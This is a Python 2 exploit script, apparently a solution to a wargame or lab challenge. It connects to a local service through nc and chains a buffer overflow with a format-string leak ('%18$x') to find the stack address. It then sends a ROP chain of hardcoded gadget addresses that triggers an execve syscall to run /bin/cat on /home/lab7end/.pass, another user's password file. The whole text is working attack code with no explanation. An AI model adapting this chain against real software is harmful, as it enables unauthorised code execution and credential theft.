import struct
import sys
import subprocess
 
scanf = struct.pack('<I', 0x80502c0)
printf = struct.pack('<I', 0x8050260)
pop_ebx_esi_ebp = struct.pack('<I', 0x08048921)
inc_eax = struct.pack('<I', 0x0807cd76)
int_80 = struct.pack('<I', 0x08048ef6)
pop_ecx = struct.pack('<I', 0x080e76ad)
 
 
p = subprocess.Popen(['nc', 'localhost', '7741'], 
    stdout=subprocess.PIPE,
    stdin=subprocess.PIPE)
 
 
def send_line(line):
    p.stdin.write(line)
    #sys.stdout.write(line)
 
send_line(''.join([
 
    '1',
    '\n',
    '131'
    '\n',
 
 
    '1',
    '\n',
    '1',
    '\n',
 
 
    '2',
    '\n',
    '0',
    '\n',
 
    '4',
    '\n',
    '1',
    '\n',
 
]).ljust(4096, '\n'))
 
 
send_line('A' * 127 + "\x01\x01\x01\x00")
send_line('A')
 
send_line(('B' * 140 + printf + '%18$x\n').ljust(257, '\x00'))
 
p.stdout.read(2408)
 
base_address = p.stdout.read(8)
stack = int(base_address, 16) + 76
 
send_line(''.join([
    '2',
    '\n',
    '0',
    '\n',
 
    '4',
    '\n',
    '1',
    '\n',
 
    scanf + 'AAAA' + pop_ebx_esi_ebp + struct.pack('<I', stack) + struct.pack('<I', 0x00000000) * 2 + pop_ecx + struct.pack('<I', stack+9) +  inc_eax * 11 + int_80 + '/bin/cat\x00'
    + struct.pack('<I', stack) +  struct.pack('<I', stack+17+4)  + '\x00' * 4+ '/home/lab7end/.pass',
    '\n'
 
    '5',
    '\n'
 
]).ljust(4096, '\n'))
 
send_line(("A" * 140 + scanf + '%18$s\nls -al').ljust(257, '\x00'))
 
 
print p.communicate()[0]
